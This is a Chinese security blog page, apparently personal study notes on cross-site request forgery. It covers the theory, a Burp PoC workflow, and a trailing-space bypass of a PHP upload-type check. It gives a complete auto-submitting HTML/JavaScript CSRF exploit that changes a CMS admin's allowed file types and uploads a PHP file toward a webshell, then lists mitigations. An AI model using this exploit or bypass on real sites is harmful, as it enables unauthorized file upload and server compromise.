@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="只因不值得">
+  <meta name="keywords" content="">
+  <title>CSRF学习笔记 - 只因不值得</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>只因不值得</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    964 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      4 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+              <p
+                class="note note-warning">本文最后更新于：2019 , 六月 9日 星期日, 2:23 下午</p>
+            
+            <div class="markdown-body">
+              <h1 id="简介-amp-原理"><a href="#简介-amp-原理" class="headerlink" title="简介 &amp; 原理"></a>简介 &amp; 原理</h1><p>CSRF（Cross-site request Forgery）是指<code>跨站请求伪造</code>，也被成为”One Click Attack”通常缩写（CSRF或XSRF）</p>
+<p>CSRF通过伪装成受信任用户请求信任的网站<br><code>CSRF的攻击是建立在会话之上的！</code></p>
+<p><strong>原理</strong><br>网站的cookie在浏览器中不会过期，只要不关闭浏览器或退出登录，在这期间，攻击者发送了构造后的CSRF脚本或者包含CSRF的脚本链接，可能会执行一些用户不想操作的事情！</p>
+<p>主要是你的浏览器正处于与此网站的会话之中，那么在你权限内可进行的操作都是合法的！</p>
+<p>也是就：攻击者盗用了你等身份，以你的身份进行一系列的操作</p>
+<a id="more"></a>
+
+<hr>
+<h1 id="CSRF简易利用"><a href="#CSRF简易利用" class="headerlink" title="CSRF简易利用"></a>CSRF简易利用</h1><p>找到你想要利用的功能，利用burp中的csrf-poc插件<br>进行poc的编写<br>然后保存，诱惑用户点击<br>成功<br>![](/images/Web/CSRF/burp csrf-poc.png)<br><img src="/images/Web/CSRF/html.png" srcset="/img/loading.gif" alt=""><br><img src="/images/Web/CSRF/submit.png" srcset="/img/loading.gif" alt=""><br><img src="/images/Web/CSRF/%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt=""></p>
+<hr>
+<h1 id="CSRF之文件上传"><a href="#CSRF之文件上传" class="headerlink" title="CSRF之文件上传"></a>CSRF之文件上传</h1><p>很多时候文件上传，只有在后台才能执行，想要利用，就要突破限制可上传文件类型，只有这样才有机会利用文件上传getshell</p>
+<pre><code>function typecheck($str_type, $uptype) {
+    if (empty($str_type)) return false;
+    $allow_type = explode(&#39;|&#39;, $str_type);
+    $newallowType = array();
+    foreach ($allow_type as $key =&gt; $allow_type) {
+        $allow_typefile = strtolower($allow_type);
+        if ($allow_typefile == &#39;php&#39;) {
+            continue;
+        }
+        $newallowType[$allow_type] = $allow_type;
+    }
+    if (array_key_exists($uptype, $newallowType)) {
+        return true;
+    } else {
+        return false;
+    }
+}</code></pre><blockquote>
+<p>Ps：小技巧：添加文件类型时添加一个<code>.php</code>(后面有空格)的文件类型，它能绕过$all_typefile==’php’的判断，同时在写入文件的时候windows能自动忽略最后面的空格</p>
+</blockquote>
+<p>构造POC：<br>1.修改配置文件添加允许的上传文件类型<br>2.上传shell文件</p>
+<pre><code>&lt;html&gt;
+  &lt;body&gt;
+    &lt;form action=&quot;http://192.168.219.129/admin/index.php?archive=management&amp;action=setsave&quot; id=&quot;CSRF&quot; method=&quot;post&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;upfile_pictype&quot; value=&quot;jpg|png|gif&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;uifile_movertype&quot; value=&quot;swf|mpg|flv|mp4&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;upfile_filetype&quot; value=&quot;zip|rar|doc|xls|php |pdf&quot;&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+    function submitRequest()
+    {
+        var xhr = new XMLHttpRequest();
+        xhr.open(&quot;POST&quot;, &quot;http://192.168.219.129/admin/index.php?archive=filemanage&amp;action=upfilesave&quot;, true);
+        xhr.setRequestHeader(&quot;Accept&quot;, &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;);
+        xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;de-de,de;q=0.8,en-us;q=0.5,en;q=0.3&quot;);
+        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;multipart/form-data; boundary=---------------------------165693120326202&quot;);
+        xhr.withCredentials = &quot;true&quot;;
+        var body = &quot;-----------------------------165693120326202\r\n&quot; +
+          &quot;Content-Disposition: form-data; name=\&quot;path\&quot;\r\n&quot; +
+          &quot;\r\n&quot; +
+          &quot;upfile/\r\n&quot;+
+          &quot;-----------------------------165693120326202\r\n&quot; +
+          &quot;Content-Disposition: form-data; name=\&quot;MAX_FILE_SIZE\&quot;\r\n&quot; +
+          &quot;\r\n&quot; +
+          &quot;100000000\r\n&quot; +
+          &quot;-----------------------------165693120326202\r\n&quot; +
+          &quot;Content-Disposition: form-data; name=\&quot;img_width\&quot;\r\n&quot; +
+          &quot;\r\n&quot; +
+          &quot;200\r\n&quot; +
+          &quot;-----------------------------165693120326202\r\n&quot; +
+          &quot;Content-Disposition: form-data; name=\&quot;img_height\&quot;\r\n&quot; +
+          &quot;\r\n&quot; +
+          &quot;200\r\n&quot; +
+          &quot;-----------------------------165693120326202\r\n&quot; +
+          &quot;Content-Disposition: form-data; name=\&quot;filetype\&quot;\r\n&quot; +
+          &quot;\r\n&quot; +
+          &quot;file\r\n&quot; +
+          &quot;-----------------------------165693120326202\r\n&quot; +
+          &quot;Content-Disposition: form-data; name=\&quot;lng\&quot;\r\n&quot; +
+          &quot;\r\n&quot; +
+          &quot;cn\r\n&quot; +
+          &quot;-----------------------------165693120326202\r\n&quot; +
+          &quot;Content-Disposition: form-data; name=\&quot;isgetback\&quot;\r\n&quot; +
+          &quot;\r\n&quot; +
+          &quot;1\r\n&quot; +
+          &quot;-----------------------------165693120326202\r\n&quot; +
+          &quot;Content-Disposition: form-data; name=\&quot;upfilepath\&quot;; filename=\&quot;php.php \&quot;\r\n&quot; +
+          &quot;Content-Type: application/octet-stream\r\n&quot; +
+          &quot;\r\n&quot; +
+          &quot;&lt;?php  phpinfo(); ?&gt;\r\n&quot; +
+          &quot;-----------------------------165693120326202--\r\n&quot;;
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i &lt; aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+    }
+    var f = document.getElementById(&quot;CSRF&quot;);
+    f.submit();
+    submitRequest()
+    &lt;/script&gt;
+    &lt;!--&lt;form action=&quot;#&quot;&gt;
+      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot; /&gt;
+    &lt;/form&gt;--&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre><hr>
+<h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><ul>
+<li>验证HTTP Referer字段</li>
+<li>在请求地址中添加token并验证</li>
+<li>在HTTP头中自定义属性并验证</li>
+</ul>
+<hr>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/240" target="_blank" rel="noopener">https://xz.aliyun.com/t/240</a><br><a href="https://xz.aliyun.com/t/1673" target="_blank" rel="noopener">https://xz.aliyun.com/t/1673</a><br><a href="https://xz.aliyun.com/t/999" target="_blank" rel="noopener">https://xz.aliyun.com/t/999</a><br><a href="http://www.ms08067.com/" target="_blank" rel="noopener">http://www.ms08067.com/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/08/18/Web/Google%20hack%E8%AF%AD%E6%B3%95/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>常用Google-hack语法</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/08/18/Web/BurpSuite%E6%8A%93HTTPS%E6%95%B0%E6%8D%AE%E5%8C%85/">
+                        <span>BurpSuite抓HTTPS数据包</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a rel="nofollow noopener"><b>2018</b></a>
+      <i class="fab fa-angular"></i>
+      <a rel="nofollow noopener"> <b>只因不值得</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  ');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "CSRF学习笔记&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
